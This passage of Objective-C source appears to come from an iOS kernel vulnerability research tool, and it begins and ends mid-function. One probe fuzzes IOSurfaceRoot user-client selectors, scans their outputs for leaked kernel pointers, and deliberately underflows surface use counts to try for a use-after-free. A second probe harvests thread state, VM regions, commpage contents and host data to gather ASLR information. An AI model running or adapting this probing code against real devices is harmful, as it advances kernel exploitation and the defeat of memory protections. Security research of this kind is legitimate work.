        int unexpectedOutputs = 0;
        int potentialVulns = 0;

        // Step 1: Open IOSurface user client
        log(@"IOCONNCALL: Step 1 — Opening IOSurfaceRoot user client");

        io_connect_t connect = 0;
        io_service_t service = 0;

        if (!isr_stopped()) {
            CFMutableDictionaryRef matchDict = sym.matching("IOSurfaceRoot");
            if (matchDict) {
                service = sym.getMatch(0, matchDict); // 0 = kIOMasterPortDefault
                if (service) {
                    kern_return_t kr = sym.open(service, mach_task_self(), 0, &connect);
                    log([NSString stringWithFormat:@"IOCONNCALL: IOServiceOpen result: 0x%x, connect=%u", kr, connect]);
                    if (kr != KERN_SUCCESS) connect = 0;
                } else {
                    log(@"IOCONNCALL: IOSurfaceRoot service not found");
                }
            }
        }

        // Step 2: Fuzz selectors 0-33 with various input patterns
        if (!isr_stopped() && connect) {
            log(@"IOCONNCALL: Step 2 — Fuzzing selectors 0-33");

            uint8_t structBuf[65536];
            memset(structBuf, 0x41, sizeof(structBuf));
            // Embed IOSurface-like magic values
            *(uint32_t *)(structBuf + 0) = 0x494F5346; // "IOSF"
            *(uint64_t *)(structBuf + 8) = 0xDEADBEEFCAFEBABE;

            size_t testSizes[] = {0, 8, 64, 256, 1024, 4096, 65536};
            int numSizes = sizeof(testSizes) / sizeof(testSizes[0]);

            for (uint32_t sel = 0; sel <= 33 && !isr_stopped(); sel++) {
                for (int szIdx = 0; szIdx < numSizes && !isr_stopped(); szIdx++) {
                    selectorsTested++;

                    uint64_t scalarOut[16];
                    uint32_t scalarOutCnt = 16;
                    uint8_t structOut[4096];
                    size_t structOutSize = sizeof(structOut);
                    memset(scalarOut, 0, sizeof(scalarOut));
                    memset(structOut, 0, sizeof(structOut));

                    // Scalar inputs: surface ID = 1, various values
                    uint64_t scalarIn[6] = {1, 0, 0, 0, 0, 0};
                    uint32_t scalarInCnt = 1;

                    // Special crafted inputs for known selectors
                    if (sel == 9 || sel == 10) {
                        // s_increment/decrement_use_count
                        scalarIn[0] = 1; // surface ID
                        scalarInCnt = 1;
                    } else if (sel == 6) {
                        // s_set_value — use more scalars
                        scalarInCnt = 2;
                        scalarIn[1] = 0xFFFFFFFF;
                    }

                    kern_return_t kr = sym.call(connect, sel,
                                                scalarIn, scalarInCnt,
                                                testSizes[szIdx] > 0 ? structBuf : NULL,
                                                testSizes[szIdx],
                                                scalarOut, &scalarOutCnt,
                                                structOut, &structOutSize);

                    if (kr == KERN_SUCCESS) {
                        successes++;
                        // Check for unexpected output data
                        if (scalarOutCnt > 0) {
                            for (uint32_t i = 0; i < scalarOutCnt; i++) {
                                if ((scalarOut[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                                    (scalarOut[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                    unexpectedOutputs++;
                                    anomalies += 10;
                                    log([NSString stringWithFormat:@"IOCONNCALL: KERNEL PTR in scalar output! sel=%u size=%zu out[%u]=0x%llx",
                                         sel, testSizes[szIdx], i, scalarOut[i]]);
                                }
                            }
                        }
                        if (structOutSize > 0 && structOutSize != sizeof(structOut)) {
                            // Scan struct output for kernel pointers
                            for (size_t b = 0; b + 7 < structOutSize; b += 8) {
                                uint64_t val = *(uint64_t *)(structOut + b);
                                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                                    (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                    unexpectedOutputs++;
                                    anomalies += 10;
                                    log([NSString stringWithFormat:@"IOCONNCALL: KERNEL PTR in struct output! sel=%u size=%zu offset=%zu val=0x%llx",
                                         sel, testSizes[szIdx], b, val]);
                                }
                            }
                        }

                        if (testSizes[szIdx] >= 4096) {
                            potentialVulns++;
                            anomalies += 3;
                            log([NSString stringWithFormat:@"IOCONNCALL: LARGE INPUT ACCEPTED sel=%u size=%zu scalarOut=%u structOut=%zu",
                                 sel, testSizes[szIdx], scalarOutCnt, structOutSize]);
                        }
                    } else {
                        failures++;
                    }
                }
            }

            log([NSString stringWithFormat:@"IOCONNCALL: Tested %d, success=%d fail=%d unexpected=%d vulns=%d",
                 selectorsTested, successes, failures, unexpectedOutputs, potentialVulns]);
        }

        // Step 3: Special exploitation of use-count selectors (9/10)
        if (!isr_stopped() && connect) {
            log(@"IOCONNCALL: Step 3 — Use-count manipulation (selectors 9/10)");

            // Create a surface first
            NSDictionary *props = @{
                @"IOSurfaceWidth":  @32,
                @"IOSurfaceHeight": @32,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241,
            };
            IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)props);
            if (testSurf) {
                IOSurfaceID surfID = sym.getID(testSurf);

                // Increment use count many times
                int incSucc = 0;
                for (int i = 0; i < 100 && !isr_stopped(); i++) {
                    uint64_t scIn = surfID;
                    kern_return_t kr = sym.call(connect, 9, &scIn, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (kr == KERN_SUCCESS) incSucc++;
                }
                log([NSString stringWithFormat:@"IOCONNCALL: increment_use_count x100: %d succeeded", incSucc]);

                // Decrement use count many more times to try underflow
                int decSucc = 0;
                for (int i = 0; i < 150 && !isr_stopped(); i++) {
                    uint64_t scIn = surfID;
                    kern_return_t kr = sym.call(connect, 10, &scIn, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (kr == KERN_SUCCESS) decSucc++;
                    else break; // Stop if kernel rejects
                }
                log([NSString stringWithFormat:@"IOCONNCALL: decrement_use_count x150: %d succeeded", decSucc]);

                if (decSucc > incSucc) {
                    anomalies += 10;
                    potentialVulns++;
                    log(@"IOCONNCALL: USE COUNT UNDERFLOW — more decrements than increments succeeded!");
                }

                // Check if surface is still valid
                IOSurfaceRef lookback = sym.lookup(surfID);
                if (!lookback) {
                    anomalies += 15;
                    potentialVulns++;
                    log(@"IOCONNCALL: SURFACE DESTROYED via use-count underflow! Potential UAF vector!");
                } else {
                    log(@"IOCONNCALL: Surface still valid after use-count manipulation");
                }

                CFRelease(testSurf);
            }
        }

        // Step 4: High selector fuzzing (34-99)
        if (!isr_stopped() && connect) {
            log(@"IOCONNCALL: Step 4 — High selector fuzzing (34-99)");
            int highSucc = 0;
            for (uint32_t sel = 34; sel < 100 && !isr_stopped(); sel++) {
                uint64_t scOut[4];
                uint32_t scOutCnt = 4;
                uint8_t stOut[256];
                size_t stOutSize = sizeof(stOut);

                kern_return_t kr = sym.call(connect, sel,
                                            NULL, 0, NULL, 0,
                                            scOut, &scOutCnt,
                                            stOut, &stOutSize);
                if (kr == KERN_SUCCESS) {
                    highSucc++;
                    selectorsTested++;
                    successes++;
                    anomalies += 5;
                    log([NSString stringWithFormat:@"IOCONNCALL: HIGH SELECTOR %u ACCEPTED! scalarOut=%u structOut=%zu",
                         sel, scOutCnt, stOutSize]);
                }
            }
            if (highSucc > 0) {
                log([NSString stringWithFormat:@"IOCONNCALL: %d high selectors accepted — potential undocumented methods!", highSucc]);
            }
        }

        // Cleanup
        if (connect) sym.close(connect);
        if (service) sym.release(service);

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"IOCONNCALL: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"IOCONNCALL: tested=%d success=%d fail=%d unexpected=%d vulns=%d anomalies=%d",
             selectorsTested, successes, failures, unexpectedOutputs, potentialVulns, anomalies]);

        NSString *verdict;
        if (unexpectedOutputs > 5) verdict = @"CRITICAL — kernel pointers leaked via IOConnectCallMethod!";
        else if (potentialVulns > 3) verdict = @"HIGH — multiple potential vulnerabilities found in user client!";
        else if (unexpectedOutputs > 0) verdict = @"HIGH — kernel data exposed in selector outputs!";
        else if (potentialVulns > 0) verdict = @"MEDIUM — suspicious selector behavior detected";
        else if (successes > 20) verdict = @"MEDIUM — many selectors accept input, attack surface available";
        else verdict = @"LOW — selectors well-validated";
        log([NSString stringWithFormat:@"IOCONNCALL: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"selectorsTested": @(selectorsTested),
            @"successes": @(successes),
            @"failures": @(failures),
            @"unexpectedOutputs": @(unexpectedOutputs),
            @"potentialVulns": @(potentialVulns)
        };
        isr_checkpoint(@"ISR-IOConnCall-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 93: Task Port Self-Inspection + Kernel Info Harvest
void iosurface_research_task_intro(ISRLogBlock log, ISRDoneBlock done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) {
            log(@"TASKINTRO: Failed to load symbols");
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }
        log(@"TASKINTRO: === Probe 93: Task Port Self-Inspection ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int regionsFound = 0;
        int sharedRegions = 0;
        int commpageDataPts = 0;
        int totalInfoHarvested = 0;
        uint64_t kernelVersion = 0;

        // Step 1: TASK_DYLD_INFO
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 1 — task_info TASK_DYLD_INFO");

            struct task_dyld_info dyldInfo;
            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
            kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&dyldInfo, &count);
            if (kr == KERN_SUCCESS) {
                totalInfoHarvested++;
                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos=0x%llx", dyldInfo.all_image_info_addr]);
                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos_size=%llu", dyldInfo.all_image_info_size]);
                log([NSString stringWithFormat:@"TASKINTRO: dyld_all_image_infos_format=%d", dyldInfo.all_image_info_format]);

                if (dyldInfo.all_image_info_addr > 0x100000000ULL) {
                    anomalies++;
                    log(@"TASKINTRO: High dyld address — possible ASLR data");
                }
            }
        }

        // Step 2: TASK_VM_INFO
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 2 — task_info TASK_VM_INFO");

            task_vm_info_data_t vmInfo;
            mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
            kern_return_t kr = task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vmInfo, &count);
            if (kr == KERN_SUCCESS) {
                totalInfoHarvested++;
                log([NSString stringWithFormat:@"TASKINTRO: virtual_size=%llu", vmInfo.virtual_size]);
                log([NSString stringWithFormat:@"TASKINTRO: resident_size=%llu", vmInfo.resident_size]);
                log([NSString stringWithFormat:@"TASKINTRO: page_size=%d", vmInfo.page_size]);
                log([NSString stringWithFormat:@"TASKINTRO: phys_footprint=%llu", vmInfo.phys_footprint]);
                log([NSString stringWithFormat:@"TASKINTRO: min_address=0x%llx", vmInfo.min_address]);
                log([NSString stringWithFormat:@"TASKINTRO: max_address=0x%llx", vmInfo.max_address]);
            }
        }

        // Step 3: Thread state harvest
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 3 — Thread state harvest");

            thread_act_array_t threads;
            mach_msg_type_number_t threadCount;
            kern_return_t kr = task_threads(mach_task_self(), &threads, &threadCount);
            if (kr == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"TASKINTRO: Found %u threads", threadCount]);
                totalInfoHarvested++;

                for (mach_msg_type_number_t t = 0; t < threadCount && t < 8 && !isr_stopped(); t++) {
#ifdef __arm64__
                    arm_thread_state64_t state;
                    mach_msg_type_number_t stateCnt = ARM_THREAD_STATE64_COUNT;
                    kr = thread_get_state(threads[t], ARM_THREAD_STATE64, (thread_state_t)&state, &stateCnt);
                    if (kr == KERN_SUCCESS) {
                        uint64_t pc = arm_thread_state64_get_pc(state);
                        uint64_t sp = arm_thread_state64_get_sp(state);
                        uint64_t lr = arm_thread_state64_get_lr(state);
                        log([NSString stringWithFormat:@"TASKINTRO: Thread[%u] PC=0x%llx SP=0x%llx LR=0x%llx", t, pc, sp, lr]);
                        totalInfoHarvested++;

                        // Check for unusual PC values
                        if (pc > 0xFFFF000000000000ULL) {
                            anomalies += 10;
                            log([NSString stringWithFormat:@"TASKINTRO: KERNEL PC DETECTED on thread %u! 0x%llx", t, pc]);
                        }
                    }
#endif
                }

                // Deallocate thread ports
                for (mach_msg_type_number_t t = 0; t < threadCount; t++) {
                    mach_port_deallocate(mach_task_self(), threads[t]);
                }
                vm_deallocate(mach_task_self(), (vm_address_t)threads, threadCount * sizeof(thread_act_t));
            }
        }

        // Step 4: Full VM region enumeration
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 4 — VM region enumeration");

            vm_address_t addr = 0;
            int maxRegions = 2000;
            int submapCount = 0;
            int rwxRegions = 0;

            while (addr < 0x7FFFFFFFFFFF && regionsFound < maxRegions && !isr_stopped()) {
                vm_size_t size = 0;
                natural_t depth = 0;
                struct vm_region_submap_info_64 info;
                mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;

                kern_return_t kr = vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                                        (vm_region_info_t)&info, &count);
                if (kr != KERN_SUCCESS) break;

                regionsFound++;

                if (info.is_submap) {
                    submapCount++;
                    sharedRegions++;
                }

                // Detect RWX regions
                if ((info.protection & VM_PROT_ALL) == VM_PROT_ALL) {
                    rwxRegions++;
                    anomalies += 3;
                    log([NSString stringWithFormat:@"TASKINTRO: RWX REGION at 0x%lx size=0x%lx!", (unsigned long)addr, (unsigned long)size]);
                }

                // Detect shared memory from kernel
                if (info.share_mode == SM_SHARED || info.share_mode == SM_TRUESHARED) {
                    sharedRegions++;
                    if (regionsFound <= 20 || info.share_mode == SM_TRUESHARED) {
                        log([NSString stringWithFormat:@"TASKINTRO: SHARED at 0x%lx size=0x%lx mode=%d",
                             (unsigned long)addr, (unsigned long)size, info.share_mode]);
                    }
                }

                addr += size;
                if (addr == 0) break; // overflow
            }

            log([NSString stringWithFormat:@"TASKINTRO: Enumerated %d regions, %d shared, %d submaps, %d RWX",
                 regionsFound, sharedRegions, submapCount, rwxRegions]);
            totalInfoHarvested++;
        }

        // Step 5: Commpage probe
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 5 — Commpage probe");

            // ARM64 commpage is at 0x0000000FFFFFC000 or similar
            vm_address_t commpageAddrs[] = {
                0x0000000FFFFFC000ULL,
                0xFFFFFC000ULL,
                0x7FFFFFE00000ULL,
            };

            for (int c = 0; c < 3 && !isr_stopped(); c++) {
                vm_address_t cpAddr = commpageAddrs[c];
                uint8_t buf[4096];
                vm_size_t readSize = 4096;
                vm_size_t bytesRead = 0;

                kern_return_t kr = vm_read_overwrite(mach_task_self(), cpAddr, readSize,
                                                     (vm_address_t)buf, &bytesRead);
                if (kr == KERN_SUCCESS && bytesRead > 0) {
                    commpageDataPts++;
                    anomalies += 2;
                    log([NSString stringWithFormat:@"TASKINTRO: COMMPAGE READABLE at 0x%lx! Read %lu bytes",
                         (unsigned long)cpAddr, (unsigned long)bytesRead]);

                    // Scan for interesting data
                    int nonZero = 0;
                    for (vm_size_t i = 0; i < bytesRead; i++) {
                        if (buf[i] != 0) nonZero++;
                    }
                    log([NSString stringWithFormat:@"TASKINTRO: Commpage has %d non-zero bytes of %lu",
                         nonZero, (unsigned long)bytesRead]);

                    // Check for version strings
                    for (vm_size_t i = 0; i + 7 < bytesRead; i += 8) {
                        uint64_t val = *(uint64_t *)(buf + i);
                        if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
                            (val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            anomalies += 5;
                            log([NSString stringWithFormat:@"TASKINTRO: KERNEL PTR IN COMMPAGE offset=0x%zx val=0x%llx", (size_t)i, val]);
                            totalInfoHarvested++;
                        }
                    }

                    totalInfoHarvested++;
                }
            }
        }

        // Step 6: host_info
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 6 — host_info harvest");

            host_basic_info_data_t hostInfo;
            mach_msg_type_number_t count = HOST_BASIC_INFO_COUNT;
            kern_return_t kr = host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&hostInfo, &count);
            if (kr == KERN_SUCCESS) {
                totalInfoHarvested++;
                log([NSString stringWithFormat:@"TASKINTRO: max_cpus=%d avail_cpus=%d memory_size=%llu cpu_type=%d cpu_subtype=%d",
                     hostInfo.max_cpus, hostInfo.avail_cpus, (uint64_t)hostInfo.max_mem,
                     hostInfo.cpu_type, hostInfo.cpu_subtype]);
            }

            vm_statistics64_data_t vmStats;
            count = HOST_VM_INFO64_COUNT;
            kr = host_statistics64(mach_host_self(), HOST_VM_INFO64, (host_info64_t)&vmStats, &count);
            if (kr == KERN_SUCCESS) {
                totalInfoHarvested++;
                log([NSString stringWithFormat:@"TASKINTRO: free=%llu active=%llu inactive=%llu wire=%llu",
                     (uint64_t)vmStats.free_count, (uint64_t)vmStats.active_count,
                     (uint64_t)vmStats.inactive_count, (uint64_t)vmStats.wire_count]);
                log([NSString stringWithFormat:@"TASKINTRO: zero_fill=%llu reactivations=%llu pageins=%llu pageouts=%llu",
                     vmStats.zero_fill_count, vmStats.reactivations,
                     vmStats.pageins, vmStats.pageouts]);
            }
        }

        // Step 7: processor info
        if (!isr_stopped()) {
            log(@"TASKINTRO: Step 7 — Processor topology");

            host_t host = mach_host_self();
            processor_info_array_t procInfo;
            mach_msg_type_number_t procCount;
            natural_t numProcs;

            kern_return_t kr = host_processor_info(host, PROCESSOR_CPU_LOAD_INFO, &numProcs, &procInfo, &procCount);
            if (kr == KERN_SUCCESS) {
                totalInfoHarvested++;
                log([NSString stringWithFormat:@"TASKINTRO: %u processors detected", numProcs]);
                vm_deallocate(mach_task_self(), (vm_address_t)procInfo, procCount * sizeof(natural_t));
            }
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"TASKINTRO: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"TASKINTRO: regions=%d shared=%d commpage=%d kernVer=%llu totalInfo=%d anomalies=%d",
             regionsFound, sharedRegions, commpageDataPts, kernelVersion, totalInfoHarvested, anomalies]);

        NSString *verdict;
        if (commpageDataPts > 0 && anomalies > 10) verdict = @"CRITICAL — commpage readable + kernel data harvested!";
        else if (anomalies > 10) verdict = @"HIGH — significant kernel info harvested!";
